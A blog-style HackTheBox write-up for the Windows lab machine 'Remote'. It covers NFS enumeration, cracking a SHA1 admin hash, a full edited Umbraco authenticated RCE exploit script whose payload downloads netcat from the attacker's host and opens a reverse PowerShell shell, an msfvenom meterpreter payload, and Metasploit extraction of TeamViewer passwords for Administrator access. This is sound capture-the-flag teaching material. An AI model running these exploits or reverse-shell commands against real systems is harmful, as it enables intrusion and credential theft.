---
title: "HackTheBox: Remote Writeup"
date: 2020-09-08 23:39:00 +0000
categories:
  - blog
tags:
  - CTF
  - HTB
  - English
---

This week's box will be Remote from HackTheBox, its a Windows box with the difficulty rating Easy. The process of rooting this box contains taking advantage of a poorly configured **NFS** share, exploiting an **Authenticated Remote Code Execution** vulnerability in a popular CMS, and using a pretty recent CVE to decrypt **TeamViewer** passwords from Windows registry.

![Remote Info](https://jackhack.se/assets/images/remote/remote_info.png)

# Recon

~~~
# Nmap 7.80 scan initiated Wed Jul 15 13:58:38 2020 as: nmap -sC -sV -oA initial -T5 10.10.10.180
Warning: 10.10.10.180 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.180
Host is up (0.066s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-15T18:04:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 15 14:00:42 2020 -- 1 IP address (1 host up) scanned in 124.65 seconds
~~~
{: .language-bash}

Nmap scan shows ther is a HTTP server, a FTP server, SMB running, some RPC ports and a *mountd* service exposed. 

Starting to check the FTP-server for something using anonymous login as it was allowed according to the nmap scan. 

~~~
┌──(kali@kali)-[~/boxes/remote]
└─$ ftp 10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp> pwd
257 "/" is current directory.
ftp> dir -r
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp>
~~~
{: .language-bash}

There seems to be no files which i can access with the anonymous login, moving on by starting some enumeration on the web server in the background, while manually checking out the *mountd* port.

~~~
┌──(kali@kali)-[~/boxes/remote]
└─$ gobuster dir -u http://10.10.10.180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --timeout 20s  
~~~

*showmount* is a tool that ships with Kali Linux, and we can use it to list NFS-shares of a remote host and the permissions of these shares, showmount has to be run as root.

~~~
┌──(kali@kali)-[~/boxes/remote]
└─$ sudo showmount -e 10.10.10.180

Export list for 10.10.10.180:
/site_backups (everyone)
~~~
{: .language-bash}

This means there is a share called "site_backups" mountable by everyone, so i will make a local mount point and check it out.

~~~
┌──(kali@kali)-[~/boxes/remote]
└─$ mkdir site_backups
┌──(kali@kali)-[~/boxes/remote]
└─$ sudo mount -t nfs 10.10.10.180:/site_backups ./site_backups
┌──(kali@kali)-[~/boxes/remote/site_backups]
└─$ ls
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
~~~
{: .language-bash}

Spending a few minutes inside this NFS-share i found a file inside **App_Data** named **Umbraco.sdf** Umbraco is an open source CMS platform used by many sites, and *sdf* is a fileformat containing a database saved in the SQL Server Compact format. Running *strings* on the file gives me multiple pages of text containing usernames like *ssmith* and *admin*

~~~
┌──(kali@kali)-[~/boxes/remote/site_backups/App_Data]
└─$ strings Umbraco.sdf
~~~
{: .language-bash}

![Strings](https://jackhack.se/assets/images/remote/strings.png)

Running strings again but this time also grep:ing for "admin"

~~~
┌──(kali@kali)-[~/boxes/remote/site_backups/App_Data]               
└─$ strings Umbraco.sdf | grep admin
~~~
{: .language-bash}
![strings_grep.png](https://jackhack.se/assets/images/remote/strings_grep.png)

One of the first lines reveals a SHA1 hashed password, cracking this with *john* will provide me with admin credentials to the Umbraco CMS.

~~~
┌──(kali@kali)-[~/boxes/remote]
└─$ echo "b8be16afba8c314ad33d812f22a04991b90e2aaa" > hash
┌──(kali㉿kali)-[~/boxes/remote]
└─$ sudo john -w=/usr/share/wordlists/rockyou.txt hash              
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)
1g 0:00:00:01 DONE (2020-09-08 16:26) 0.9345g/s 9181Kp/s 9181Kc/s 9181KC/s baconandchipies1..bacon918
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
~~~
{: .language-bash}

Now i finally have a set of credentials.

*admin@htb.local:baconandcheese*

Checking out the previosuly started gobuster i see that it found some interesting pages

~~~
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.180
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/08 16:29:04 Starting gobuster
===============================================================
/contact (Status: 200)
/blog (Status: 200)
/home (Status: 200)
/products (Status: 200)
/people (Status: 200)
/Home (Status: 200)
/Products (Status: 200)
/Contact (Status: 200)
/install (Status: 302)
/Blog (Status: 200)
/about-us (Status: 200)
--snip--
~~~

Going to 
~~~ 
http://remote.htb/install
~~~
Redirects me to umbraco's login page

![Umbraco login page](https://jackhack.se/assets/images/remote/install.png)

Logging in with the obtained credentials works, checking the "Help" menu also reveals the version of Umbraco

![Version](https://jackhack.se/assets/images/remote/version.png)

Using searchsploit to check for any known vulnerabilies in Umbraco

~~~
┌──(kali@kali)-[~/boxes/remote]
└─$ searchsploit umbraco
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                                                                                                                                      | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                                                               | aspx/webapps/46153.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                                                                                               | php/webapps/44988.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali@kali)-[~/boxes/remote]
└─$ cp /usr/share/exploitdb/exploits/aspx/webapps/46153.py .
┌──(kali@kali)-[~/boxes/remote]
└─$ vi 46153.py
~~~
{: .language-bash}

Editing some parts of the script

* Changing authentication parameters: 
*login = "admin@htb.local";
password="baconandcheese";
host = "http://remote.htb/";*
* Changin cmd to download netcat binary, execute it and provide me with a powershell-shell
*cmd = "mkdir /tmp;iwr -uri http://10.10.14.40/nc.exe -outfile /tmp/nc.exe;/tmp/nc.exe 10.10.14.40 9001 -e powershell*


The full script after editing looks like this
~~~
# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A                                      
# Date: 2019-01-13                                                                                                   
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases                                                                                                                                                                                 # Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS    
# CVE: N/A                                      

                                                          
import requests;
from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());
    
print("Start");

# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "mkdir /tmp;iwr -uri http://10.10.14.40/nc.exe -outfile /tmp/nc.exe;/tmp/nc.exe 10.10.14.40 9001 -e powershell"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "admin@htb.local";
password="baconandcheese";
host = "http://remote.htb/";

# Step 1 - Get Main page
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print_dict(r1.cookies);

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);

print("End");
~~~
{: .language-python}

Starting a python3 web server, and opening a netcat listener then running the exploit gives me an initial shell.

![Shell](https://jackhack.se/assets/images/remote/shell.png)

Getting **user.txt**
~~~
PS C:\Users\Public> more user.txt
more user.txt
1ea16------------------cf8b44187

PS C:\Users\Public>
~~~

# Root

After some time enumerating the box and checking my privileges i found out that the popular remote access tool TeamViewer was installed on the box, thinking about the name of the box i thought this would be the way to escalate privilees

~~~
PS C:\> cd "Program Files (x86)"
cd "Program Files (x86)"
PS C:\Program Files (x86)> dir
dir


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/15/2018   3:28 AM                Common Files                                                          
d-----        9/15/2018   5:06 AM                Internet Explorer                                                     
d-----        2/23/2020   2:19 PM                Microsoft SQL Server                                                  
d-----        2/23/2020   2:15 PM                Microsoft.NET                                                         
d-----        2/19/2020   3:11 PM                MSBuild                                                               
d-----        2/19/2020   3:11 PM                Reference Assemblies                                                  
d-----        2/20/2020   2:14 AM                TeamViewer                                                            
d-----        9/15/2018   5:05 AM                Windows Defender                                                      
d-----        9/15/2018   3:19 AM                Windows Mail                                                          
d-----       10/29/2018   6:39 PM                Windows Media Player                                                  
d-----        9/15/2018   3:19 AM                Windows Multimedia Platform                                           
d-----        9/15/2018   3:28 AM                windows nt                                                            
d-----       10/29/2018   6:39 PM                Windows Photo Viewer                                                  
d-----        9/15/2018   3:19 AM                Windows Portable Devices                                              
d-----        9/15/2018   3:19 AM                WindowsPowerShell                                                     


PS C:\Program Files (x86)>
~~~

Everyone might not know, but Teamviewer version 7 was found to store session passwords encrypted with the same AES key and IV which can be used to decrypt passwords stored in the Windows registry.
Read more [here](https://nvd.nist.gov/vuln/detail/CVE-2019-18988) and [here](https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264)

Here i took the easy route, since there is a metasploit module for this. I started by making an executeable shell with *msfvenom* 

~~~
┌──(kali㉿kali)-[~/boxes/remote]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.40 LPORT=9002 -f exe > shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
~~~
{: .language-bash}

Hosting it with python3 http.server module, and downloading it to the remote box using powershells Invoke-WebRequest.

~~~
PS C:\tmp> iwr -uri http://10.10.14.40/shell.exe -outfile /tmp/shell.exe
~~~

Starting up *msfconsole* using the *multi/handler* module, setting the payload to *windows/meterpreter/reverse_tcp* and setting *LHOST* and *LPORT* options.

~~~
msf5 > use multi/handler                                  
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.40                                      
msf5 exploit(multi/handler) > set LPORT 9002
LPORT => 9002                                             
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.40:9002
~~~

Running the executeable on the victim machine

~~~
PS C:\tmp> ./shell.exe
~~~

The meterpreter shell worked just fine, the teamviewer password module is located at *post/windows/gather/credentials/teamviewer_passwords* so i background the session, use the module and run it against the backgrounded session. 

~~~
[*] Sending stage (176195 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.14.40:9002 -> 10.10.10.180:49714) at 2020-09-08 17:06:07 -0400

meterpreter > bg                                          
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use post/windows/gather/credentials/teamviewer_passwords
[*] Using post/windows/gather/credentials/teamviewer_passwords
msf5 post(windows/gather/credentials/teamviewer_passwords) > set SESSION 1
SESSION => 1                                              
msf5 post(windows/gather/credentials/teamviewer_passwords) > run

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
[+] Passwords stored in: /home/kali/.msf4/loot/20200908170750_default_10.10.10.180_host.teamviewer__739520.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are ''
[*] TeamViewer's version is ''
[-] Unable to find TeamViewer's process
[*] Post module execution completed
~~~

We found the password **!R3m0te!**, using this password i was able to connect to the Administrator account trough *evil-winrm*

Getting root.txt:

~~~
┌──(kali@kali)-[~/boxes/remote]
└─$ evil-winrm -i 10.10.10.180 -u Administrator -p "\!R3m0te\!"                                                                                                                                                                        1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         9/8/2020   2:21 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
45926f98606----------0d2ea968a71

*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
~~~


